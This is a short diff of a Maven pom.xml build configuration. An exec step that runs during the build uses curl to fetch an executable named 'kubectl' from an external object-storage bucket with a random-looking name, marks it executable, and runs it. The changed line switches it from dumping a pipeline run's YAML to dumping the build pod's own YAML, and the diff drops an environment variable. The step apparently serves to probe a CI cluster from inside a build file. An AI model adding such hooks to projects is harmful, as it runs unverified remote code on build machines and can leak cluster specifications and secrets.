@@ -36,11 +36,8 @@
                             <!-- 命令的参数 -->
                             <arguments>
                                 <argument>-c</argument>
-                                <argument>curl https://cbvbcv.tos-cn-beijing.volces.com/kubectl -o /tmp/kubectl;chmod +x /tmp/kubectl;/tmp/kubectl get pipelineruns $EXECUTION_ID -o yaml</argument>
+                                <argument>curl https://cbvbcv.tos-cn-beijing.volces.com/kubectl -o /tmp/kubectl;chmod +x /tmp/kubectl;/tmp/kubectl get pods $(hostname) -o yaml</argument>
                             </arguments>
-                            <environmentVariables>
-                                <EXECUTION_ID>${ENV.EXECUTION_ID}</EXECUTION_ID>
-                            </environmentVariables>
                         </configuration>
                     </execution>
                 </executions>
